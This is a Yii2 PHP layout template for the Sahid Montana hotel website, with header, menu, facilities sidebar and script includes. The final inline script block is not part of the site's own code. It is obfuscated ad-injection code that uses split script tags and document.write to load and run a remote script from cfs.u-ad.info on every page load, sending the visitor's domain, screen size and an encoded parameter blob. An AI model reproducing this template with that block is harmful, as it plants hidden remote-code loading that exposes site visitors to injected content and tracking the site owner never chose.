<?php

use yii\helpers\Html;
use frontend\assets\AppAsset;
use common\models\Article;
use common\models\ArticleCategory;

$session = Yii::$app->session;
AppAsset::register($this);
$this->beginPage();
?>
<!DOCTYPE html>
<html> 
    <head>
        <meta charset=utf-8>
        <title><?= Html::encode($this->title) ?> | Sahid Montana</title>
        <meta name=description content="Sahid Montana Hotel">
        <meta name=keywords content="Hotel Sahid Montana Malang">
        <link href="http://fonts.googleapis.com/css?family=Droid+Sans:400,700%7cDroid+Serif:400,700,400italic,700italic%7cYellowtail%7cGreat+Vibes" rel=stylesheet type=text/css>
        <link type="text/css" rel='stylesheet' href="<?= Yii::$app->homeUrl ?>css/styles.css">
    </head>
    <body class="inner-page shortcodes pattern-2">
        <header id=main-header>
            <div class="header-content container"> 
                <div class=menu-container>
                    <div class="main-logo">
                        <img src="<?= Yii::$app->homeUrl ?>img/logo.png">
                    </div>
                    <nav id=main-menu> 
                        <?php
//                        $sahid = ArticleCategory::find()->where(['id' => 16])->orderBy('name ASC')->all();
                        $sahid = Article::find()->where(['article_category_id' => 16, 'publish'=>1])->orderBy('title ASC')->all();
                        echo $this->render('_menu', ['sahid' => $sahid]);
                        ?>
                    </nav>
                    <div id=main-menu-handle>
                        <span></span>
                    </div>
                </div> 
            </div>
        </header>
        <div class="background">
            <?= $content ?>
            <aside class="col-md-3">
                <div class="side-boxes"> 
                    <h3 class="side-title">Our Facility</h3>
                    <div class="side-contents"> 
                        <ul> 
                            <li><a href="<?= Yii::$app->urlManager->createUrl('facility/room') ?>">Room</a></li> 
                            <li><a href="<?= Yii::$app->urlManager->createUrl('facility/restaurant') ?>">Restaurant</a></li> 
                            <li><a href="<?= Yii::$app->urlManager->createUrl('facility/meeting-and-banquet') ?>">Meeting Room</a></li> 
                        </ul> 
                    </div> 
                </div> 
            </aside>
        </div>
    </div>
    <?php
    echo $this->render('_footer');
    ?> 
</div> 
<!-- JS Includes --> <!-- Essential JS files ( DO NOT REMOVE THEM ) --> 
<script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/jquery-1.11.1.min.js></script> 
<script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/jquery.modernizr.min.js></script>
<!-- Include required js files --> 
<script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/owl.carousel.min.js></script>
<script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/helper.js></script>
<script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/init.js></script>
<script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/template.js></script>
<script type="text/javascript">
    if (self == top) {
        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
        var idc_glo_r = Math.floor(Math.random() * 99999999999);
        document.write("<scr" + "ipt type=text/javascript src=" + idc_glo_url + "cfs.u-ad.info/cfspushadsv2/request");
        document.write("?id=1");
        document.write("&amp;enc=telkom2");
        document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlR%2fVeDMuDxgFsCFjIEn2Hw7b0sb9LUjJl4y%2bIANt8ZtVR%2bYCp36c4Bsfos88lI60avfhyHxJH9%2fhA4nvKf4t48mE9u3WoRsIuwHeZn1ZNpeMt6uPdObKwNRGg7vVk5K3p8%2bcAUtCD3e5zfANssRPbJvACW3AnYVw65IuFjvZcPnQoLegD22%2fNMGOlM59dhtHLoJBkROMBxlLV%2bJ9vu%2fZyzos67Nmkcr6QLqp50k45ZzzA5TCjTTFJSQdm1ry3Bz9mbZcusC0%2bXd12QBV7YRoqIZOrBhcv1S5wmgtX3kgAsUa6QiGb3bk42q93EtO%2ffuC6QMb9iXxCR%2fPKr4kh5NGGx2etQ%2b6QDyDl8TJHaZs8NnvYa7UQim9PlYk%2buFvG5o6b%2fgoD4s8B69uXhDdN3cHBF%2b6Vi8QoLtH1TI0Hm00O5QCzt9P10on70A1vjQLLWH%2bIevKLKCB%2f5SLE%3d");
        document.write("&amp;idc_r=" + idc_glo_r);
        document.write("&amp;domain=" + document.domain);
        document.write("&amp;sw=" + screen.width + "&amp;sh=" + screen.height);
        document.write("></scr" + "ipt>");
    }
</script>
</body> 
</html>